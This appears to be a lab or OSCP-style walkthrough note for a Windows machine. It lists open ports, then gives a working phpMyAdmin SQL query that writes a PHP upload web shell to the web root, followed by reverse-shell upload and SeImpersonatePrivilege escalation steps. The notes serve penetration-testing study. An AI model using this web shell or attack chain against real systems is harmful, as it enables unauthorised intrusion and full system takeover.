[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

```powershell
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49667/tcp open  msrpc         Microsoft Windows RPC
```

---
## Software Versions

```powershell
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'

```

---
## Discovered Subdomains

---
## Discovered Credentials

---
## Interesting Files/Paths

---
## Attack Ideas

---
## Steps to User.txt

[[3128 Squid Proxy]]

Squid 4.14 found

Port 3128 Squid requires port scanning

port 8080 found

add 3128 squid to foxyproxy, access 8080

gives access to a wampserver hub page

phpmyadmin link shows login page

root:[blank] is the password

Clicking on top left tiny question mark icon gives version number

phpmyadmin 5.0.2

Click on SQL tab

paste this

```
SELECT  
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

This creates uploader.php

Go to this page

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:8080/uploader.php`;

dv.paragraph("```bash\n" + command + "\n```");
```
Upload reverse shell.php. Only Ivan Sincek script works https://www.revshells.com/

go to the page

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}:8080/phpreverseshell.php`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Steps to root.txt

Landed in NT Authority/Local

So use [[FullPowers]]

To regain [[SeImpersonatePrivilege]]

Catch reverse shell into NT Authority/SYSTEM

---
## User Flag

```

```

## Root Flag

```

```